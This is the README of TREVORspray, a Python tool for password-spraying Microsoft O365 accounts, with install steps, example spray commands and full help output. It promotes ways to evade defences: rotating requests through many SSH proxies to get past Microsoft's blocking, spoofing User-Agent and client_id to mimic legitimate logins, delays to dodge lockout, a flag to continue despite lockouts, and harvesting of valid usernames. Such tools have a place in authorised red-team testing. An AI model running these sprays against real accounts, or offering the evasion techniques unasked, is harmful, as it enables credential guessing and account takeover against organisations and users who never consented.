![trevor](https://user-images.githubusercontent.com/20261699/92336575-27071380-f070-11ea-8dd4-5ba42c7d04b7.jpeg)
`#trevorforget`

# TREVORspray
A featureful Python O365 sprayer based on [MSOLSpray](https://github.com/dafthack/MSOLSpray) which uses the [Microsoft Graph API](https://docs.microsoft.com/en-us/graph/overview)

By [@thetechr0mancer](https://twitter.com/thetechr0mancer)

![trevorspray](https://user-images.githubusercontent.com/20261699/92338226-e366d680-f07c-11ea-8664-7b320783dc98.png)

Microsoft is getting better and better about blocking password spraying attacks against O365.  **TREVORspray can solve this by proxying its requests through an unlimited number of `--ssh` hosts**.  No weird dependencies or cumbersome setup required - all you need is a cloud VM with port 22 open.

CREDIT WHERE CREDIT IS DUE - MANY THANKS TO:
- [@dafthack](https://twitter.com/dafthack) for writing [MSOLSpray](https://github.com/dafthack/MSOLSpray)
- [@Mrtn9](https://twitter.com/Mrtn9) for his Python port of [MSOLSpray](https://github.com/MartinIngesen/MSOLSpray)

## Features
- Tells you the status of each account: if it exists, is locked, has MFA enabled, etc.
- Automatic cancel/resume (attempted user/pass combos are remembered in `./logs/tried_logins.txt`)
- Round-robin proxy through multiple IPs using only vanilla `--ssh`
- Automatic infinite reconnect/retry if a proxy goes down (or if you lose internet)
- Spoofs `User-Agent` and `client_id` to look like legitimate auth traffic
- Logs everything to `./logs/trevorspray.log`
- Saves valid usernames to `./logs/valid_usernames.txt`
- Optional `--delay` between request to bypass M$ lockout countermeasures

## Installation:
```
$ git clone https://github.com/blacklanternsecurity/trevorspray
$ cd trevorspray
$ pip install -r requirements.txt
```

## Example: Spray O365 with 5-second delay between requests
```
$ trevorspray.py -e bob@evilcorp.com -p Fall2020! --delay 5
```

## Example: Spray O365 and round-robin between 3 IPs (the current IP is used as well.)
```
$ trevorspray.py -e emails.txt -p Fall2020! --ssh root@1.2.3.4 root@4.3.2.1 -kp
```

## Help:
```
$ ./trevorspray.py --help
usage: trevorspray.py [-h] -e EMAILS [EMAILS ...] -p PASSWORDS [PASSWORDS ...] [-f] [-d DELAY] [--url URL] [-v] [-s SSH [SSH ...]] [-k KEY] [-kp]
                      [--base-port BASE_PORT]

Have fun spraying O365 through SSH proxies

optional arguments:
  -h, --help            show this help message and exit
  -e EMAILS [EMAILS ...], --emails EMAILS [EMAILS ...]
                        Emails(s) and/or file(s) filled with emails
  -p PASSWORDS [PASSWORDS ...], --passwords PASSWORDS [PASSWORDS ...]
                        Password(s) that will be used to perform the password spray
  -f, --force           Forces the spray to continue and not stop when multiple account lockouts are detected
  -d DELAY, --delay DELAY
                        Sleep for this many seconds between requests
  --url URL             The URL to spray against (default is https://login.microsoft.com)
  -v, --verbose         Print extra debugging info
  -s SSH [SSH ...], --ssh SSH [SSH ...]
                        Round-robin load-balance through these SSH hosts (user@host) NOTE: Current IP address is also used once per round
  -k KEY, --key KEY     Use this SSH key when connecting to proxy hosts
  -kp, --key-pass       SSH key requires a password
  --base-port BASE_PORT
                        Base listening port to use for SOCKS proxies
```

## Known Limitations:
- Untested on Windows
- Only works against the M$ Graph API (right now at least)